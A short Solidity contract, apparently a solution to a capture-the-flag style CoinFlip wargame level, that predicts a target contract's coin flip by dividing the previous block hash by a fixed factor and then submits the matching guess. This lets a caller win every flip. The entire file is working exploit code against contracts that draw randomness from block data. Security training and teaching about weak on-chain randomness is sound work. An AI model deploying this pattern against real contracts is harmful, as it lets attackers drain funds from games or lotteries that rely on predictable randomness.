// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract HackCoinFlip {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  uint256 lastHash;

  ICoinFlip coinFlip;

  constructor(address _coinFlipAddr) {
      coinFlip = ICoinFlip(_coinFlipAddr);
  }

  function flip() external returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 value = blockValue / FACTOR;
    bool side = value == 1 ? true : false;

    return coinFlip.flip(side);
  }
}